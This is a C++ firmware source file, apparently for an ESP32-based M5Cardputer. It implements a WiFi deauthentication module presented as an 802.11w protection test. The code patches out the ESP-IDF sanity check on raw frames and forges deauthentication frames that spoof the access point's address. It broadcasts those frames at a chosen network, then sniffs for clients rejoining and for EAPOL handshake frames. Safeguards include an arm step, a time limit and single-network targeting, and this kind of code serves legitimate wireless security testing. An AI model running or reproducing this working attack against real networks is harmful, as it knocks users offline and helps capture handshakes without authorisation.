#include "wifi_deauth.h"

#include <M5Cardputer.h>
#include <WiFi.h>
#include <esp_wifi.h>

#include <cstdio>
#include <cstring>

#include "app/recorder.h"
#include "app/theme.h"
#include "app/ui.h"
#include "hal/board.h"

// The ESP-IDF refuses to transmit a forged management frame through
// esp_wifi_80211_tx: ieee80211_raw_frame_sanity_check rejects it. Testing
// whether a network accepts forged management frames is the entire point of
// 802.11w, so that check has to be bypassed to run the test at all.
//
// It is done with a linker wrap rather than by redefining the symbol. The
// symbol in libnet80211.a is strong, not weak, so a plain redefinition is a
// multiple-definition error -- and the workaround usually reached for,
// -Wl,-zmuldefs, disables duplicate-symbol detection across the WHOLE link and
// would hide a genuine one-definition-rule bug anywhere in the firmware. The
// wrap flag in platformio.ini redirects exactly this one call and nothing else.
//
// It lives at the top of the single file that sends such a frame, not in a
// helper, so that anyone reading this file can see precisely what has been
// unlocked and where.
extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2,
                                                       int32_t arg3) {
    (void)arg; (void)arg2; (void)arg3;
    return 0;
}

namespace orthrus::modules {

using namespace orthrus::theme;
namespace bd  = orthrus::board;
namespace d11 = orthrus::dot11;

namespace {

constexpr uint32_t kRedrawMs   = 160;
constexpr uint32_t kScanGuard  = 15000;
constexpr uint32_t kBeaconWait = 3000;   // one beacon interval is ~100 ms

constexpr int kBodyTop = 21;
constexpr int kRowH    = 14;
constexpr int kRows    = 6;

constexpr char kKeyUp    = ';';
constexpr char kKeyDown  = '.';
constexpr char kKeyBack  = '`';
constexpr char kKeyArm   = 'a';

// Frames per burst tick. Deliberately modest: the point is to establish whether
// forged management frames are accepted, which takes a handful, not a flood.
constexpr int kFramesPerTick = 4;

// ---- the sniffer side -------------------------------------------------------
//
// Used twice: once to read the target's beacon before anything is sent, and
// again afterwards to watch for clients coming back.

volatile bool     g_capture     = false;
uint8_t           g_wantBssid[d11::kMacLen] = {0};

uint8_t           g_beacon[320] = {0};
volatile uint16_t g_beaconLen   = 0;

volatile uint32_t g_eapol      = 0;
volatile uint32_t g_assocResp  = 0;
volatile uint32_t g_deauth     = 0;

void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!g_capture || buf == nullptr) return;
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

    const auto* pkt = static_cast<const wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* frame = pkt->payload;
    const uint16_t len   = pkt->rx_ctrl.sig_len;
    if (len < 24) return;

    d11::FrameInfo fi;
    if (!d11::parseHeader(frame, len, fi)) return;

    if (fi.type == d11::FrameType::Management) {
        // Only this one network. Everything else in the air is somebody else's.
        if (!d11::macEqual(fi.addr3, g_wantBssid)) return;

        if (fi.subtype == d11::kSubtypeBeacon && g_beaconLen == 0) {
            uint16_t n = len;
            if (n > sizeof(g_beacon)) n = sizeof(g_beacon);
            std::memcpy(g_beacon, frame, n);
            g_beaconLen = n;
            return;
        }
        // A client coming back: the access point answering an association.
        if (fi.subtype == d11::kSubtypeAssocResp) g_assocResp++;
        if (fi.subtype == d11::kSubtypeDeauth)    g_deauth++;
        return;
    }

    // A fresh four-way handshake is the clearest proof a client dropped and
    // rejoined.
    uint8_t bssid[d11::kMacLen], sta[d11::kMacLen];
    if (!d11::resolveEndpoints(fi, bssid, sta)) return;
    if (!d11::macEqual(bssid, g_wantBssid)) return;

    const uint8_t* payload = nullptr;
    size_t payloadLen = 0;
    if (d11::eapolPayload(frame, len, fi, &payload, &payloadLen)) g_eapol++;
}

void startSniffing(const uint8_t bssid[d11::kMacLen], uint8_t channel) {
    std::memcpy(g_wantBssid, bssid, d11::kMacLen);
    g_beaconLen = 0;
    g_eapol = g_assocResp = g_deauth = 0;

    wifi_promiscuous_filter_t filter = {};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    g_capture = true;
}

void stopSniffing() {
    g_capture = false;
    esp_wifi_set_promiscuous(false);
}

// One deauthentication frame, built by hand.
//
// Reason 7 is "class 3 frame received from nonassociated station", which is
// what a real access point sends when it wants a client to start again. It is
// the reason code an access point would use itself, so a network that accepts
// it is accepting exactly the frame 802.11w exists to authenticate.
uint8_t buildDeauth(uint8_t* out, const uint8_t dest[d11::kMacLen],
                    const uint8_t bssid[d11::kMacLen]) {
    out[0] = 0xC0;  // type management, subtype deauthentication
    out[1] = 0x00;
    out[2] = 0x00;  // duration
    out[3] = 0x00;
    std::memcpy(out + 4, dest, d11::kMacLen);   // addr1: receiver
    std::memcpy(out + 10, bssid, d11::kMacLen); // addr2: transmitter (the AP)
    std::memcpy(out + 16, bssid, d11::kMacLen); // addr3: BSSID
    out[22] = 0x00;  // sequence control, filled in by the MAC
    out[23] = 0x00;
    out[24] = 0x07;  // reason code, little endian
    out[25] = 0x00;
    return 26;
}

void signalBars(int x, int y, int8_t rssi, uint16_t colour) {
    auto& d = ui::gfx();
    int bars = 1;
    if (rssi > -60)      bars = 4;
    else if (rssi > -70) bars = 3;
    else if (rssi > -80) bars = 2;
    for (int i = 0; i < 4; i++) {
        const int h  = 2 + i * 2;
        const int bx = x + i * 3;
        if (i < bars) d.fillRect(bx, y - h, 2, h, colour);
        else          d.drawRect(bx, y - h, 2, h, kRule);
    }
}

}  // namespace

bool WifiDeauth::begin() {
    count_ = 0;
    for (uint8_t i = 0; i < kMaxNetworks; i++) nets_[i] = Network{};
    armed_ = false;
    gnss_.begin();

    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false, false);
    delay(50);
    startScan();
    return true;
}

void WifiDeauth::startScan() {
    scanning_    = true;
    scanStarted_ = millis();
    WiFi.scanNetworks(/*async=*/true, /*show_hidden=*/true);
}

void WifiDeauth::collectScan() {
    if (!scanning_) return;

    const int found = WiFi.scanComplete();
    if (found < 0) {
        if (millis() - scanStarted_ > kScanGuard) {
            WiFi.scanDelete();
            scanning_ = false;
        }
        return;
    }

    count_ = 0;
    for (int i = 0; i < found && count_ < kMaxNetworks; i++) {
        Network n;
        std::snprintf(n.ssid, d11::kSsidBuf, "%s", WiFi.SSID(i).c_str());
        if (const uint8_t* b = WiFi.BSSID(i)) std::memcpy(n.bssid, b, d11::kMacLen);
        n.channel = static_cast<uint8_t>(WiFi.channel(i));
        n.rssi    = static_cast<int8_t>(WiFi.RSSI(i));
        n.open    = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN);
        nets_[count_++] = n;
    }
    WiFi.scanDelete();
    scanning_ = false;
}

void WifiDeauth::readTargetBeacon() {
    if (selected_ < 0 || selected_ >= static_cast<int>(count_)) return;
    Network& n = nets_[selected_];

    startSniffing(n.bssid, n.channel);

    // Beacons come about ten times a second, so this normally returns in well
    // under a tenth of the budget. If the network went away, we say we could
    // not read it rather than assuming anything about its protection.
    const uint32_t deadline = millis() + kBeaconWait;
    while (millis() < deadline && g_beaconLen == 0) {
        M5Cardputer.update();
        delay(10);
    }

    if (g_beaconLen > 0) {
        d11::FrameInfo fi;
        if (d11::parseHeader(g_beacon, g_beaconLen, fi)) {
            d11::BeaconInfo b;
            if (d11::parseBeacon(g_beacon + fi.headerLen, g_beaconLen - fi.headerLen,
                                 b)) {
                n.rsn        = b.rsn;
                n.hasWps     = b.hasWps;
                n.open       = !b.hasRsn && !b.hasWpa;
                n.haveBeacon = true;
                if (b.channel) n.channel = b.channel;
            }
        }
    }
    stopSniffing();
}

WifiDeauth::Protection WifiDeauth::protectionOf(const Network& n) const {
    if (!n.haveBeacon) return Protection::Unknown;
    if (n.open) return Protection::OpenNetwork;
    if (!n.rsn.present) return Protection::Off;      // WPA/WEP era: no 802.11w at all
    if (n.rsn.pmfRequired) return Protection::Required;
    if (n.rsn.pmfCapable)  return Protection::Optional;
    return Protection::Off;
}

const char* WifiDeauth::protectionName(Protection p) {
    switch (p) {
        case Protection::Off:         return "802.11w OFF";
        case Protection::Optional:    return "802.11w optional";
        case Protection::Required:    return "802.11w REQUIRED";
        case Protection::OpenNetwork: return "open network";
        case Protection::Unknown:     return "not read yet";
    }
    return "not read yet";
}

// ---- the test ----------------------------------------------------------------

void WifiDeauth::stepBurst() {
    if (view_ != View::Firing) return;

    Network& n = nets_[selected_];

    if (millis() - burstStart_ >= kMaxBurstMs) {
        // Stops on its own. Nothing here runs until the battery dies.
        view_       = View::Watching;
        watchStart_ = millis();
        startSniffing(n.bssid, n.channel);
        return;
    }

    static const uint8_t kBroadcast[d11::kMacLen] = {0xFF, 0xFF, 0xFF,
                                                     0xFF, 0xFF, 0xFF};
    uint8_t frame[26];
    const uint8_t len = buildDeauth(frame, kBroadcast, n.bssid);

    for (int i = 0; i < kFramesPerTick; i++) {
        if (esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false) == ESP_OK) framesSent_++;
        delay(2);
    }
}

void WifiDeauth::stepWatch() {
    if (view_ != View::Watching) return;

    eapolSeen_    = g_eapol;
    reconnects_   = g_assocResp;
    deauthEchoed_ = g_deauth;

    if (millis() - watchStart_ >= kWatchMs) {
        stopSniffing();
        finish();
    }
}

void WifiDeauth::finish() {
    const Network& n = nets_[selected_];
    const Protection p = protectionOf(n);

    char bssid[18];
    d11::formatMacColons(n.bssid, bssid);

    char detail[96];
    std::snprintf(detail, sizeof(detail),
                  "deauth test bssid=%s ch=%u pmf=%s sent=%lu rejoin=%lu", bssid,
                  static_cast<unsigned>(n.channel),
                  p == Protection::Required ? "required"
                      : p == Protection::Optional ? "optional" : "off",
                  static_cast<unsigned long>(framesSent_),
                  static_cast<unsigned long>(reconnects_ + eapolSeen_));
    app::recorder().noteFinding(detail);

    view_ = View::Result;
}

// ---- screens -----------------------------------------------------------------

void WifiDeauth::drawList() {
    ui::beginFrame();
    auto& d = ui::gfx();

    char right[20];
    std::snprintf(right, sizeof(right), "%u AP%s", static_cast<unsigned>(count_),
                  scanning_ ? " scan" : "");
    ui::chrome("Deauth", right);

    if (count_ == 0) {
        d.setFont(kFaceData);
        d.setTextDatum(top_left);
        d.setTextColor(kMuted, kInk);
        d.drawString(scanning_ ? "Scanning..." : "No networks found.", 8,
                     kBodyTop + 8);
        ui::wrapText(8, kBodyTop + 26, bd::kScreenW - 16, 10, 4, kFaint,
                     "Pick one network. There is no all-networks mode: that is "
                     "not a test, it is interference with the neighbours.");
        ui::footer("` back");
        ui::endFrame();
        return;
    }

    if (selected_ >= static_cast<int>(count_)) selected_ = count_ - 1;
    if (selected_ < scroll_) scroll_ = selected_;
    if (selected_ >= scroll_ + kRows) scroll_ = selected_ - kRows + 1;

    for (int i = 0; i < kRows; i++) {
        const int idx = scroll_ + i;
        if (idx >= static_cast<int>(count_)) break;

        const Network& n = nets_[idx];
        const int y   = kBodyTop + i * kRowH;
        const int mid = y + kRowH / 2;
        const bool sel = (idx == selected_);
        ui::listRow(y, kRowH, sel);

        const uint16_t bg = sel ? kSurface : kInk;
        d.setFont(kFaceData);
        d.setTextDatum(middle_left);

        char label[24];
        if (n.ssid[0] == '\0') std::snprintf(label, sizeof(label), "(hidden)");
        else                   std::snprintf(label, sizeof(label), "%.20s", n.ssid);
        d.setTextColor(n.ssid[0] ? kText : kMuted, bg);
        d.drawString(label, 8, mid);

        ui::textAt(150, mid, kFaint, "ch%u", static_cast<unsigned>(n.channel));
        signalBars(190, mid + 4, n.rssi, sel ? kShine : kBrass);
    }

    d.setTextDatum(top_left);
    ui::footer("enter examine   ; . move   ` back");
    ui::endFrame();
}

void WifiDeauth::drawTarget() {
    ui::beginFrame();
    auto& d = ui::gfx();

    const Network& n = nets_[selected_];
    const Protection p = protectionOf(n);

    ui::chrome("Target", n.ssid[0] ? n.ssid : "(hidden)");

    d.setFont(kFaceData);
    char bssid[18];
    d11::formatMacColons(n.bssid, bssid);
    ui::textAt(8, kBodyTop + 5, kMuted, "%s  ch %u", bssid,
               static_cast<unsigned>(n.channel));

    // The answer, before anything is transmitted.
    uint16_t colour = kFaint;
    if (p == Protection::Required)      colour = kGood;
    else if (p == Protection::Optional) colour = kMedium;
    else if (p == Protection::Off)      colour = kCritical;

    d.setFont(kFaceUi);
    d.setTextDatum(middle_left);
    d.setTextColor(colour, kInk);
    d.drawString(protectionName(p), 8, kBodyTop + 24);
    d.setFont(kFaceData);

    const char* verdict = "";
    switch (p) {
        case Protection::Required:
            verdict = "Forged disconnects are rejected. The finding is already "
                      "here: this network is protected, and the test will show "
                      "nothing happening.";
            break;
        case Protection::Optional:
            verdict = "Negotiated per client. Clients that support it are safe; "
                      "older ones on the same network are not.";
            break;
        case Protection::Off:
            verdict = "Every client can be disconnected by anyone in range. The "
                      "test will demonstrate it.";
            break;
        case Protection::OpenNetwork:
            verdict = "No encryption at all, so there is no management frame "
                      "protection to have.";
            break;
        case Protection::Unknown:
            verdict = "Could not read a beacon from this network. Nothing is "
                      "assumed about its protection.";
            break;
    }
    ui::wrapText(8, kBodyTop + 36, bd::kScreenW - 16, 10, 4, kMuted, verdict);

    if (n.hasWps)
        ui::textAt(8, bd::kScreenH - kFooterH - 22, kHigh, "WPS is advertised");

    d.setTextDatum(top_left);
    if (armed_) {
        ui::textAt(8, bd::kScreenH - kFooterH - 11, kCritical,
                   "ARMED -- enter transmits");
        ui::footer("enter fire   a disarm   ` back");
    } else {
        ui::footer("a arm   ` back");
    }
    ui::endFrame();
}

void WifiDeauth::drawFiring() {
    ui::beginFrame();
    auto& d = ui::gfx();
    const Network& n = nets_[selected_];

    const uint32_t elapsed = millis() - burstStart_;
    const uint32_t left = elapsed >= kMaxBurstMs ? 0 : (kMaxBurstMs - elapsed) / 1000;

    char right[16];
    std::snprintf(right, sizeof(right), "%lus left", static_cast<unsigned long>(left));
    ui::chrome("Transmitting", right);

    d.setFont(kFaceUi);
    d.setTextDatum(middle_left);
    d.setTextColor(kCritical, kInk);
    d.drawString(n.ssid[0] ? n.ssid : "(hidden)", 8, kBodyTop + 12);

    d.setFont(kFaceData);
    ui::textAt(8, kBodyTop + 30, kMuted, "ch %u   %lu frames sent",
               static_cast<unsigned>(n.channel),
               static_cast<unsigned long>(framesSent_));

    const int barW = bd::kScreenW - 16;
    d.drawRect(8, kBodyTop + 42, barW, 8, kRule);
    const uint32_t done = elapsed > kMaxBurstMs ? kMaxBurstMs : elapsed;
    d.fillRect(9, kBodyTop + 43, (barW - 2) * static_cast<int>(done) /
                                     static_cast<int>(kMaxBurstMs), 6, kCritical);

    ui::wrapText(8, kBodyTop + 56, bd::kScreenW - 16, 10, 3, kFaint,
                 "Stops on its own. Any key ends it now and moves straight to "
                 "watching for clients coming back.");

    d.setTextDatum(top_left);
    ui::footer("any key   stop");
    ui::endFrame();
}

void WifiDeauth::drawWatching() {
    ui::beginFrame();
    auto& d = ui::gfx();

    const uint32_t elapsed = millis() - watchStart_;
    const uint32_t left = elapsed >= kWatchMs ? 0 : (kWatchMs - elapsed) / 1000;

    char right[16];
    std::snprintf(right, sizeof(right), "%lus", static_cast<unsigned long>(left));
    ui::chrome("Watching", right);

    d.setFont(kFaceData);
    d.setTextDatum(top_left);
    d.setTextColor(kMuted, kInk);
    d.drawString("Listening for clients coming back.", 8, kBodyTop + 6);

    ui::textAt(8, kBodyTop + 26, kText, "%lu association replies",
               static_cast<unsigned long>(reconnects_));
    ui::textAt(8, kBodyTop + 40, kText, "%lu handshake frames",
               static_cast<unsigned long>(eapolSeen_));

    ui::wrapText(8, kBodyTop + 56, bd::kScreenW - 16, 10, 3, kFaint,
                 "A client rejoining is proof the forgery worked. Silence is not "
                 "proof it did not -- there may be no clients here.");

    ui::footer("any key   skip");
    ui::endFrame();
}

void WifiDeauth::drawResult() {
    ui::beginFrame();
    auto& d = ui::gfx();

    const Network& n = nets_[selected_];
    const Protection p = protectionOf(n);
    const uint32_t evidence = reconnects_ + eapolSeen_;

    ui::chrome("Result", n.ssid[0] ? n.ssid : "(hidden)");

    d.setFont(kFaceUi);
    d.setTextDatum(middle_left);

    const char* headline;
    uint16_t colour;
    const char* body;

    if (evidence > 0) {
        headline = "Clients were forced off";
        colour   = kCritical;
        body     = "Forged management frames are accepted here. Anyone in range "
                   "can disconnect any client at will. Turn on 802.11w.";
    } else if (p == Protection::Required) {
        headline = "Protected";
        colour   = kGood;
        body     = "802.11w is required and nothing came back down. The network "
                   "rejected the forgery, which is exactly what it should do.";
    } else {
        headline = "No effect seen";
        colour   = kMedium;
        // The honesty rule this whole product runs on, applied to an active
        // test: not seeing something is not evidence it cannot happen.
        body     = "Nothing reconnected. That may mean no clients were attached, "
                   "not that the network is protected. Absence is not proof.";
    }

    d.setTextColor(colour, kInk);
    d.drawString(headline, 8, kBodyTop + 12);

    d.setFont(kFaceData);
    ui::textAt(8, kBodyTop + 30, kFaint, "%lu sent   %lu rejoined   %s",
               static_cast<unsigned long>(framesSent_),
               static_cast<unsigned long>(evidence), protectionName(p));

    ui::wrapText(8, kBodyTop + 44, bd::kScreenW - 16, 10, 4, kMuted, body);

    d.setTextDatum(top_left);
    ui::footer("any key   back");
    ui::endFrame();
}

bool WifiDeauth::handleKeys() {
    if (!M5Cardputer.Keyboard.isChange() || !M5Cardputer.Keyboard.isPressed())
        return true;

    const auto ks = M5Cardputer.Keyboard.keysState();

    // Any key stops a burst. Not a specific one: whatever the operator hits in a
    // hurry has to work.
    if (view_ == View::Firing) {
        view_       = View::Watching;
        watchStart_ = millis();
        startSniffing(nets_[selected_].bssid, nets_[selected_].channel);
        return true;
    }
    if (view_ == View::Watching) {
        stopSniffing();
        finish();
        return true;
    }
    if (view_ == View::Result) {
        view_  = View::List;
        armed_ = false;
        startScan();
        return true;
    }

    if (ks.enter) {
        if (view_ == View::List && count_) {
            view_ = View::Target;
            armed_ = false;
            readTargetBeacon();
        } else if (view_ == View::Target && armed_) {
            view_       = View::Firing;
            burstStart_ = millis();
            framesSent_ = 0;
            reconnects_ = eapolSeen_ = deauthEchoed_ = 0;
            // Promiscuous mode has to be off to transmit reliably; it goes back
            // on for the watch phase.
            stopSniffing();
            esp_wifi_set_channel(nets_[selected_].channel, WIFI_SECOND_CHAN_NONE);
        }
        return true;
    }

    for (char c : ks.word) {
        switch (c) {
            case kKeyBack:
                if (view_ == View::Target) {
                    view_  = View::List;
                    armed_ = false;
                    return true;
                }
                return false;

            case kKeyArm:
                // Arming is its own step, and backing out clears it. The same
                // shape as BadUSB, for the same reason.
                if (view_ == View::Target) armed_ = !armed_;
                return true;

            case kKeyUp:
                if (view_ == View::List && selected_ > 0) selected_--;
                return true;

            case kKeyDown:
                if (view_ == View::List && selected_ + 1 < static_cast<int>(count_))
                    selected_++;
                return true;

            default:
                break;
        }
    }
    return true;
}

void WifiDeauth::run() {
    lastDrawMs_ = 0;

    for (;;) {
        M5Cardputer.update();
        gnss_.pump();
        collectScan();
        stepBurst();
        stepWatch();

        if (!handleKeys()) {
            stopSniffing();
            WiFi.scanDelete();
            WiFi.mode(WIFI_OFF);
            return;
        }

        if (millis() - lastDrawMs_ >= kRedrawMs) {
            lastDrawMs_ = millis();
            switch (view_) {
                case View::List:     drawList();     break;
                case View::Target:   drawTarget();   break;
                case View::Firing:   drawFiring();   break;
                case View::Watching: drawWatching(); break;
                case View::Result:   drawResult();   break;
            }
        }
        delay(2);
    }
}

}  // namespace orthrus::modules
